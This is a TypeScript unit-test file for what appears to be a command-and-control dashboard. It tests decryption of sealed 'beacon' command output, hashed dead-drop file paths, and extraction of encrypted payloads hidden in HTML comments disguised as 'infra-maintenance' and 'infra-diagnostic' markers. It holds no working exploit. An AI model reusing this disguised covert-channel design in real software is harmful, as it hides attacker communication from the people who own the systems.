// dashboard/src/lib/__tests__/crypto.test.ts
import { describe, it, expect } from 'bun:test';
import sodium from 'libsodium-wrappers';
import { decryptSealedResult } from '../crypto';

describe('decryptSealedResult', () => {
  it('decrypts a libsodium sealed-box message encrypted with the operator public key', async () => {
    await sodium.ready;

    // Generate a fresh operator keypair for the test
    const kp = sodium.crypto_box_keypair();

    // Simulate what a beacon does: seal-encrypt with operator public key
    const plaintext  = 'command output: root\n';
    const sealed     = sodium.crypto_box_seal(
      sodium.from_string(plaintext),
      kp.publicKey,
    );
    const sealedB64  = sodium.to_base64(sealed, sodium.base64_variants.URLSAFE_NO_PADDING);
    const privkeyB64 = sodium.to_base64(kp.privateKey, sodium.base64_variants.URLSAFE_NO_PADDING);

    // Decrypt using the operator private key
    const result = await decryptSealedResult(sealedB64, privkeyB64);
    expect(result).toBe(plaintext);
  });

  it('throws when the key is wrong', async () => {
    await sodium.ready;
    const kp1 = sodium.crypto_box_keypair();
    const kp2 = sodium.crypto_box_keypair();

    const sealed    = sodium.crypto_box_seal(sodium.from_string('secret'), kp1.publicKey);
    const sealedB64 = sodium.to_base64(sealed, sodium.base64_variants.URLSAFE_NO_PADDING);
    const wrongKey  = sodium.to_base64(kp2.privateKey, sodium.base64_variants.URLSAFE_NO_PADDING);

    await expect(decryptSealedResult(sealedB64, wrongKey)).rejects.toThrow(/decryption failed/i);
  });
});

import { recoveryDropPath } from '../crypto';

describe('recoveryDropPath', () => {
  it('uses the full sha256(beaconId) digest under the canonical drops prefix', async () => {
    expect(await recoveryDropPath('abc')).toBe(
      'drops/ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad.bin',
    );
  });

  it('formats recovery paths with a full 64-character hex digest', async () => {
    expect(await recoveryDropPath('test-beacon-id')).toMatch(
      /^drops\/[0-9a-f]{64}\.bin$/,
    );
  });
});

import { parseMaintenanceDiagnosticPayload } from '../crypto';

describe('parseMaintenanceDiagnosticPayload()', () => {
  it('returns null when commentBody is null', () => {
    const result = parseMaintenanceDiagnosticPayload(null);
    expect(result).toBeNull();
  });

  it('returns null when no infra-diagnostic marker is present', () => {
    const commentBody = `<!-- infra-maintenance:550e8400-e29b-41d4-a716-446655440000 -->
Some visible content here`;
    const result = parseMaintenanceDiagnosticPayload(commentBody);
    expect(result).toBeNull();
  });

  it('returns the sealed payload embedded in the marker', () => {
    const commentBody = `<!-- infra-maintenance:550e8400-e29b-41d4-a716-446655440000 -->
Some visible content
<!-- infra-diagnostic:550e8400-e29b-41d4-a716-446655440001:dGVzdF9wYXlsb2FkX2Jhc2U2NHVybA== -->`;
    const result = parseMaintenanceDiagnosticPayload(commentBody);
    expect(result).toBe('dGVzdF9wYXlsb2FkX2Jhc2U2NHVybA==');
  });

  it('returns null when marker present but no payload embedded', () => {
    const commentBody = `<!-- infra-maintenance:550e8400-e29b-41d4-a716-446655440000 -->
Some visible content
<!-- infra-diagnostic:550e8400-e29b-41d4-a716-446655440001 -->`;
    const result = parseMaintenanceDiagnosticPayload(commentBody);
    expect(result).toBeNull();
  });

  it('handles extra whitespace inside the marker', () => {
    const commentBody = `<!--  infra-diagnostic:550e8400-e29b-41d4-a716-446655440000:dGVzdF9wYXlsb2FkX2Jhc2U2NHVybA==  -->`;
    const result = parseMaintenanceDiagnosticPayload(commentBody);
    expect(result).toBe('dGVzdF9wYXlsb2FkX2Jhc2U2NHVybA==');
  });
});
